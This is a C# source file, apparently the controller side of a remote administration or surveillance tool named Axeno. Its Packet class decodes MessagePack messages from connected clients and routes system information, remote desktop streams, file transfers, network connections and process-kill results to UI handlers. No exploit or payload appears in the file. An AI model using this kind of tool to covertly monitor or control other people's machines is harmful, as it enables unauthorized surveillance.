using Axeno.MessagePack;
using Axeno.Networking.Connection;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using Axeno.Helper;
using System.Web.Configuration;
using Axeno.Views.Pages.MainWindow;
using System.Windows.Threading;
using Axeno.Views.Pages.ClientManager;
using Axeno.Networking.Functions.Surveillience;
using Axeno.Networking.Functions.Networking;
using Axeno.Networking.Functions.System;

namespace Axeno.Networking.Communication
{
    public class Packet
    {
        public Client client;
        public byte[] data;

        public void Read(object o)
        {
            try
            {
                MsgPack msgpck = new MsgPack();
                msgpck.DecodeFromBytes(data);
                switch (msgpck.ForcePathObject("Packet").AsString)
                {
                    case "ClientInformation":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                MainWindowSlides.ClientPanel.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {

                                new HandleListView().AddItem(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "SystemInformation":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.SysInfo.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new HandleSysInfo().InsertInformation(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "RemoteDesktopInformation":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.Rdp.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                     new RemoteDesktopFunction().Handle(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "DesktopStream":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.Rdp.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new RemoteDesktopFunction().HandleStream(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "FileSender":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.sendFile.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new HandleSendFile().HandleResult(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "UpdateInfo":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                MainWindowSlides.ClientPanel.lvclients.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new HandleUpdateInfo().Update(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "NetworkConnections":
                        ThreadPool.QueueUserWorkItem(delegate
                        {

                            client.netCon.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                new NetworkConnections().Handle(client, msgpck);
                            }));
                        });
                        break;
                    case "ProcessList":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.Proc_mgr.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new ProcessManager().Handle(client, msgpck);
                                }));
                            });
                            break;
                        }
                    case "ProcessKilled":
                        {
                            ThreadPool.QueueUserWorkItem(delegate
                            {

                                client.Proc_mgr.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                    new ProcessManager().HandleKilled(client, msgpck);
                                }));
                            });
                            break;
                        }
                }
            }
            catch
            {
                return;
            }
        }
    }
}
